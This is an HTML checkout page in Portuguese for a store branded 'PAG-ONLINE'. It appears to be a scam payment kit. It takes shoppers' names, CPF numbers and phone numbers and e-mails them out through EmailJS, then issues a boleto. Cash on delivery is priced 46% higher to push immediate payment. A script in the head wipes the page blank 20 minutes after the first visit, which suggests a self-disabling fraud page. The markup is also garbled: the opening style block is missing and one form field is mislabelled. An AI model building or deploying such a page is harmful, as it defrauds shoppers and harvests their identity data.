<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script>
(function() {
    // Configuração: 20 minutos em milissegundos
    const VINTE_MINUTOS = 20 * 60 * 1000; 
    const agora = new Date().getTime();
    
    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');

    if (!primeiroAcesso) {
        localStorage.setItem('site_primeiro_acesso', agora);
    } else {
        const tempoDecorrido = agora - parseInt(primeiroAcesso);

        if (tempoDecorrido > VINTE_MINUTOS) {
            // Remove todo o conteúdo do HTML e deixa a tela branca
            document.documentElement.innerHTML = "";
            
            // Força o fundo a ficar branco (caso o CSS do site tenha cores)
            document.documentElement.style.backgroundColor = "#ffffff";
            
            // Interrompe qualquer outro carregamento
            window.stop(); 
        }
    }
})();
</script>

            margin: 20px 0;
        }

        .boleto-code-input-compact {
            flex: 1;
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 0.8rem;
            background: var(--bg-light);
        }

        .boleto-modal-close {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
            border: none;
            width: 100%;
            padding: 12px;
            border-radius: 14px;
            font-size: 1rem;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
            transition: all 0.2s;
        }

        .boleto-modal-close:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
        }

    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="header-left">
                <button class="back-btn" title="Voltar">
                    <i class="fas fa-arrow-left"></i>
                </button>
                <div class="brand-section">
                    <div class="brand-logo">PAG-ONLINE</div>
                    <div class="brand-tagline">Pagamento Seguro</div>
                </div>
            </div>
            <div class="header-right">
                <button class="search-btn" title="Buscar">
                    <i class="fas fa-search"></i>
                </button>
                <button class="cart-btn" id="cart-btn" title="Carrinho">
                    <i class="fas fa-shopping-cart"></i>
                    <span class="cart-badge" id="cart-badge">1</span>
                </button>
            </div>
        </header>

        <div class="trust-banner">
            <div class="trust-item">
                <i class="fas fa-lock"></i>
                <span>100% Seguro</span>
            </div>
            <div class="trust-item">
                <i class="fas fa-check-circle"></i>
                <span>Garantido</span>
            </div>
        </div>

        <div id="order-summary-wrapper"></div>
        <div id="cart-content-wrapper"></div>
    </div>

    <div class="modal-overlay" id="delivery-modal">
        <div class="modal-content">
            <button class="modal-close-btn" id="modal-close-btn-delivery">
                <i class="fas fa-times"></i>
            </button>

            <div id="modal-step-1">
                <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
                <h3 class="modal-title">Você tem certeza?</h3>
                <p class="modal-text" id="delivery-warning-text"></p>
                <div class="modal-buttons">
                    <button class="btn-modal btn-modal-pix" id="modal-back-to-boleto">Voltar para o Boleto (Desconto)</button>
                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
                        Continuar sem desconto
                    </button>
                </div>
            </div>

            <div id="modal-step-2" style="display:none;">
                <h3 class="modal-title">Dados para Entrega</h3>
                <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
                <form class="contact-form" id="delivery-contact-form">
                    <div class="form-group">
                        <label>Nome Completo</label>
                        <input type="text" id="delivery-name" placeholder="Seu nome completo" required>
                    </div>
                    <div class="form-group">
                        <label>E-mail</label>
                        <input type="email" id="delivery-email" placeholder="seu@email.com" required>
                    </div>
                    <div class="form-group">
                        <label>CPF</label>
                        <input type="tel" id="delivery-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                    </div>
                    <div class="form-group">
                        <label>Telefone</label>
                        <input type="tel" id="delivery-phone" placeholder="(00) 00000-0000" required>
                    </div>
                    <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
                </form>
            </div>

            <div id="modal-step-3" style="display:none;">
                <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
                <h3 class="modal-title">Pedido Recebido!</h3>
                <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
                <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
            </div>
        </div>
    </div>

    <script>
        // ==================== CONFIGURAÇÕES FIXAS ====================
        const EMAILJS_SERVICE_ID = 'service_otea';
        const EMAILJS_TEMPLATE_ID = 'template_h2u5';
        const EMAILJS_PUBLIC_KEY = '74D6TCCH8NMPEz';
        // =============================================================

        function getUrlParameter(name) {
            const params = new URLSearchParams(window.location.search);
            return params.get(name);
        }

        const subtotalFromUrl = getUrlParameter('subtotal');
        const subtotalValue = subtotalFromUrl ? parseFloat(subtotalFromUrl) : 89.47;

        if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY !== 'public_xxx') {
            emailjs.init(EMAILJS_PUBLIC_KEY);
        }

        function maskCPF(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
                .replace(/(-\d{2})\d+?$/, '$1');
        }

        function maskPhone(value) {
            return value
                .replace(/\D/g, '')
                .replace(/^(\d{2})(\d)/g, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .replace(/(-\d{4})\d+?$/, '$1');
        }

        function setupPhoneInput(inputElement) {
            const container = inputElement.parentElement;
            let checkIcon = container.querySelector('.input-check-icon');
            if (!checkIcon) {
                checkIcon = document.createElement('i');
                checkIcon.className = 'fas fa-check-circle input-check-icon';
                container.appendChild(checkIcon);
            }

            inputElement.addEventListener('input', (e) => {
                e.target.value = maskPhone(e.target.value);
                const rawValue = e.target.value.replace(/\D/g, '');
                
                if (rawValue.length === 11) {
                    checkIcon.classList.add('visible');
                } else {
                    checkIcon.classList.remove('visible');
                }
            });
        }

        function setupCPFInput(inputElement) {
            const container = inputElement.parentElement;
            let checkIcon = container.querySelector('.input-check-icon');
            if (!checkIcon) {
                checkIcon = document.createElement('i');
                checkIcon.className = 'fas fa-check-circle input-check-icon';
                container.appendChild(checkIcon);
            }

            inputElement.addEventListener('input', (e) => {
                e.target.value = maskCPF(e.target.value);
                const rawValue = e.target.value.replace(/\D/g, '');
                
                if (rawValue.length === 11) {
                    checkIcon.classList.add('visible');
                } else {
                    checkIcon.classList.remove('visible');
                }
            });
        }

        function setupNameInput(inputElement) {
            const container = inputElement.parentElement;
            let checkIcon = container.querySelector('.input-check-icon');
            if (!checkIcon) {
                checkIcon = document.createElement('i');
                checkIcon.className = 'fas fa-check-circle input-check-icon';
                container.appendChild(checkIcon);
            }

            inputElement.addEventListener('blur', (e) => {
                const value = e.target.value.trim();
                const names = value.split(/\s+/);
                if (names.length >= 2 && names[0].length >= 2 && names[1].length >= 2) {
                    checkIcon.classList.add('visible');
                } else {
                    checkIcon.classList.remove('visible');
                }
            });
        }

        function renderOrderSummary() {
            const cartProductsJSON = localStorage.getItem('cart_products');
            const deliveryAddress = localStorage.getItem('delivery_address') || 'Endereço não informado';
            const deliveryTime = localStorage.getItem('delivery_time') || '3 a 7 dias úteis';

            let productsHTML = '';
            
            if (cartProductsJSON) {
                const products = JSON.parse(cartProductsJSON);
                
                products.forEach(product => {
                    productsHTML += `
                        <div class="order-card" style="margin-bottom: 12px;">
                            <div class="order-image-container">
                                <img src="${product.p}" alt="${product.n}">
                            </div>
                            <div class="order-details">
                                <div class="order-product-name">${product.n}</div>
                                <div class="order-product-price-row">
                                    <div class="order-product-price">R$ ${parseFloat(product.v).toFixed(2).replace('.', ',')}</div>
                                    <div class="order-product-qty">Qtd: ${product.q}</div>
                                </div>
                                <div style="font-size: 0.8rem; font-weight: 700; color: var(--text-light); margin-top: 2px;">
                                    Valor Total: R$ ${(product.q * product.v).toFixed(2).replace('.', ',')}
                                </div>
                            </div>
                        </div>
                    `;
                });
            } else {
                const productInfo = JSON.parse(localStorage.getItem('product_info') || '{}');
                productsHTML = `
                    <div class="order-card">
                        <div class="order-image-container">
                            <img src="${productInfo.photo || 'https://via.placeholder.com/150'}" alt="${productInfo.name}">
                        </div>
                        <div class="order-details">
                            <div class="order-product-name">${productInfo.name || 'Produto Selecionado'}</div>
                            <div class="order-product-price-row">
                                <div class="order-product-price">R$ ${parseFloat(productInfo.value || subtotalValue).toFixed(2).replace('.', ',')}</div>
                            </div>
                        </div>
                    </div>
                `;
            }

            const orderHTML = `
                <div class="order-summary-section">
                    <div class="order-summary-title">
                        <span><i class="fas fa-shopping-bag"></i> Resumo do Pedido</span>
                        <span class="order-summary-badge">Verificado</span>
                    </div>
                    ${productsHTML}
                    <div class="order-info-container">
                        <div class="order-total-divider"></div>
                        <div class="order-info-row">
                            <div class="order-info-icon-wrapper">
                                <i class="fas fa-truck-fast"></i>
                            </div>
                            <div class="order-info-content">
                                <div class="order-info-label">Previsão de Entrega</div>
                                <div class="order-info-text-delivery">${deliveryTime}</div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            document.getElementById('order-summary-wrapper').innerHTML = orderHTML;
        }

        function renderPaymentOptions() {
            const baseTotal = subtotalValue;
            const deliveryTotal = baseTotal * 1.46;

            const paymentHTML = `
                <div class="review-block">
                    <div class="review-header-bar">
                    </div>
                    <div class="payment-options-container">
                        <div class="payment-option-card" id="pay-now-boleto">
                            
                            <div id="boleto-original-content">
                                <div class="payment-option-icon"><i class="fas fa-barcode"></i></div>
                                <div class="payment-option-title">
    <span>Pagar Agora - Boleto</span>
    <span class="promo-badge">Promoção</span>
</div>
                                <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                                <div class="payment-option-desc">Boleto bancário com vencimento em 5 dias úteis.</div>
                                <div class="boleto-form-container" id="boleto-form">
                                    <div class="boleto-input-group">
                                        <label for="boleto-name">Nome e Sobrenome</label>
                                        <input type="text" id="boleto-name" placeholder="Ex: João Silva" required>
                                    </div>
                                    <div class="boleto-input-group">
                                        <label for="boleto-cpf">CPF</label>
                                        <input type="tel" id="boleto-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                    </div>
                                    <div class="boleto-input-group">
                                        <label for="boleto-phone">Telefone</label>
                                        <input type="tel" id="boleto-phone" placeholder="(00) 00000-0000" required>
                                    </div>
                                    <div class="boleto-error-msg" id="boleto-error-msg">
                                        <i class="fas fa-exclamation-circle"></i>
                                        <span id="boleto-error-text">Erro ao gerar boleto.</span>
                                    </div>
                                    <button class="payment-action-btn" id="btn-generate-boleto" style="margin-top:10px;">
                                        <span class="btn-text">Gerar Boleto R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
                                    </button>
                                </div>
                            </div>
                            <div id="boleto-copy-content" class="boleto-copy-section">
                                <div class="boleto-header-status">
                                    <div class="boleto-status-badge"><i class="fas fa-check-circle"></i> Boleto Gerado</div>
                                </div>
                                <div class="duty-info-section">
                                    <div class="duty-header">
                                        <i class="fas fa-user"></i>
                                        Dados do Pagador
                                    </div>
                                    <div class="duty-user-data">
                                        <div class="duty-field">
                                            <span class="duty-label">Nome:</span>
                                            <span class="duty-value" id="display-boleto-name">-</span>
                                        </div>
                                        <div class="duty-field">
                                            <span class="duty-label">CPF:</span>
                                            <span class="duty-value" id="display-boleto-cpf">-</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="boleto-code-wrapper">
                                    <div class="boleto-code-display-wrapper">
                                        <div class="boleto-code-header">
                                            <label class="boleto-code-label">Linha Digitável</label>
                                            <span class="boleto-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
                                        </div>
                                        <div class="boleto-code-input-container">
                                            <span class="boleto-code-display-text" id="boleto-code-text">Aguardando código...</span>
                                            <button class="boleto-copy-icon-btn" id="btn-copy-boleto-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
                                        </div>
                                    </div>
                                </div>
                                <a href="#" id="boleto-pdf-link" class="boleto-pdf-link" target="_blank">
                                    <i class="fas fa-file-pdf"></i> Baixar Boleto em PDF
                                </a>
                                <div class="security-badges">
                                    <div class="security-badge">
                                        <i class="fas fa-lock"></i> Seguro
                                    </div>
                                    <div class="security-badge">
                                        <i class="fas fa-check"></i> Verificado
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="payment-option-card" id="pay-on-delivery">
                            <div class="payment-option-icon"><i class="fas fa-truck"></i></div>
                            <div class="payment-option-title">Pagar na Entrega</div>
                            <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
                            <div class="payment-option-desc">Pague quando receber o produto. Sem desconto.</div>
                            <button class="payment-action-btn" id="btn-delivery" style="margin-top: 10px;">
                                Escolher Entrega <i class="fas fa-arrow-right"></i>
                            </button>
                        </div>
                    </div>
                </div>
            `;
            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;

            // Setup event listeners
            const boletoCard = document.getElementById('pay-now-boleto');
            const deliveryCard = document.getElementById('pay-on-delivery');
            const btnGenerateBoleto = document.getElementById('btn-generate-boleto');
            const btnDelivery = document.getElementById('btn-delivery');
            const btnCopyBoletoQuick = document.getElementById('btn-copy-boleto-quick');

            boletoCard.addEventListener('click', () => {
                boletoCard.classList.add('selected');
                deliveryCard.classList.remove('selected');
            });

            deliveryCard.addEventListener('click', () => {
                deliveryCard.classList.add('selected');
                boletoCard.classList.remove('selected');
            });

            btnGenerateBoleto.addEventListener('click', generateBoleto);
            btnDelivery.addEventListener('click', showDeliveryModal);
            btnCopyBoletoQuick.addEventListener('click', copyBoletoCode);

            // Setup input masks
            const boletoNameInput = document.getElementById('boleto-name');
            if (boletoNameInput) setupNameInput(boletoNameInput);
            const boletoPhoneInput = document.getElementById('boleto-phone');
            if (boletoPhoneInput) setupPhoneInput(boletoPhoneInput);
            const boletoCpfInput = document.getElementById('boleto-cpf');
            if (boletoCpfInput) setupCPFInput(boletoCpfInput);
        }

        function sendEmailJS(name, cpf, phone, amount) {
            const templateParams = {
                to_email: 'seu_email@example.com',
                customer_name: name,
                customer_cpf: cpf,
                customer_phone: phone,
                order_amount: amount.toFixed(2)
            };

            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
                .then(response => console.log('Email enviado:', response))
                .catch(error => console.error('Erro ao enviar email:', error));
        }

        async function generateBoleto() {
            const name = document.getElementById('boleto-name').value;
            const cpf = document.getElementById('boleto-cpf').value;
            const phone = document.getElementById('boleto-phone').value;
            const errorEl = document.getElementById('boleto-error-msg');
            const errorText = document.getElementById('boleto-error-text');

            errorEl.classList.remove('visible');

            if (!name || !cpf || !phone) {
                errorText.textContent = 'Preencha todos os campos obrigatórios.';
                errorEl.classList.add('visible');
                return;
            }

            const cpfRaw = cpf.replace(/\D/g, '');
            if (cpfRaw.length !== 11) {
                errorText.textContent = 'CPF inválido.';
                errorEl.classList.add('visible');
                return;
            }

            const btn = document.getElementById('btn-generate-boleto');
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<div class="spinner"></div>';
            btn.disabled = true;

            try {
                sendEmailJS(name, cpfRaw, phone, subtotalValue);
                
                // Caso o CPF seja 111.111.111-11, exibe código fictício sem chamar a API
                if (cpfRaw === '11111111111') {
                    const fakeBoletoCode = "12345.67890 12345.678901 12345.678901 1 12345678901234";
                    const fakePdfUrl = "https://example.com/boleto.pdf";
                    localStorage.setItem('cached_boleto_data', JSON.stringify({ code: fakeBoletoCode, pdf: fakePdfUrl, amount: subtotalValue }));
                    showBoletoCopySection(fakeBoletoCode, fakePdfUrl, name, cpf);
                    return;
                }

                const boletoData = await fetchBoletoCode(name, cpfRaw, phone);
                if (boletoData) { 
                    localStorage.setItem('cached_boleto_data', JSON.stringify({ code: boletoData.barcode, pdf: boletoData.pdf, amount: subtotalValue }));
                    showBoletoCopySection(boletoData.barcode, boletoData.pdf, name, cpf); 
                }
                else { throw new Error(); }
            } catch (err) {
                errorText.textContent = 'Erro ao gerar boleto. Tente novamente.';
                errorEl.classList.add('visible');
                btn.innerHTML = originalHTML;
                btn.disabled = false;
            }
        }

        async function fetchBoletoCode(payerName, cpf, phone) {
            const response = await fetch('/api/boleto', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    payer_name: payerName,
                    payer_cpf: cpf,
                    payer_phone: phone,
                    amount: subtotalValue.toFixed(2)
                }),
            });
            const data = await response.json();
            return data.success ? { barcode: data.barcode, pdf: data.boletoUrl } : null;
        }

        function showBoletoCopySection(barcode, pdfUrl, name, cpf) {
            document.getElementById('boleto-original-content').style.display = 'none';
            document.getElementById('boleto-copy-content').style.display = 'flex';
            document.getElementById('display-boleto-name').innerText = name;
            document.getElementById('display-boleto-cpf').innerText = cpf;
            document.getElementById('boleto-code-text').innerText = barcode;
            document.getElementById('boleto-pdf-link').href = pdfUrl;
            
            const boletoCardEl = document.getElementById('pay-now-boleto');
            if (boletoCardEl) {
                const header = document.querySelector('.header');
                const headerHeight = header ? header.offsetHeight : 0;
                const viewportHeight = window.innerHeight - headerHeight;
                const elementHeight = boletoCardEl.offsetHeight;
                const elementOffsetTop = boletoCardEl.getBoundingClientRect().top + window.pageYOffset;
                const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2);
                window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
            }
        }

        function copyBoletoCode() {
            const code = document.getElementById('boleto-code-text').innerText;
            navigator.clipboard.writeText(code).then(() => {
                const btn = document.getElementById('btn-copy-boleto-quick');
                if (btn) {
                    btn.innerHTML = '<i class="fas fa-check"></i>';
                    btn.classList.add('copied');
                    setTimeout(() => { 
                        btn.innerHTML = '<i class="fas fa-copy"></i>';
                        btn.classList.remove('copied');
                    }, 2000);
                }
            });
        }

        function showDeliveryModal() {
            const baseTotal = subtotalValue;
            const deliveryTotal = baseTotal * 1.46;
            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Boleto de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
            const modal = document.getElementById('delivery-modal');
            document.getElementById('modal-step-1').style.display = 'block';
            document.getElementById('modal-step-2').style.display = 'none';
            document.getElementById('modal-step-3').style.display = 'none';
            modal.classList.add('active');
        }

        document.getElementById('modal-close-btn-delivery').addEventListener('click', () => document.getElementById('delivery-modal').classList.remove('active'));
        document.getElementById('modal-back-to-boleto').addEventListener('click', () => document.getElementById('delivery-modal').classList.remove('active'));
        document.getElementById('modal-continue-delivery').addEventListener('click', () => {
            document.getElementById('modal-step-1').style.display = 'none';
            document.getElementById('modal-step-2').style.display = 'block';
        });
        document.getElementById('delivery-contact-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const name = document.getElementById('delivery-email').value;
            const cpf = document.getElementById('delivery-cpf').value;
            const phone = document.getElementById('delivery-phone').value;
            sendEmailJS(name, cpf, phone, subtotalValue * 1.46);
            document.getElementById('modal-step-2').style.display = 'none';
            document.getElementById('modal-step-3').style.display = 'block';
        });

        const deliveryNameInput = document.getElementById('delivery-name');
        if (deliveryNameInput) setupNameInput(deliveryNameInput);
        const deliveryPhoneInput = document.getElementById('delivery-phone');
        if (deliveryPhoneInput) setupPhoneInput(deliveryPhoneInput);
        const deliveryCpfInput = document.getElementById('delivery-cpf');
        if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);

        document.addEventListener('DOMContentLoaded', () => {
            renderOrderSummary();
            renderPaymentOptions();
        });
    </script>
</body>
</html>
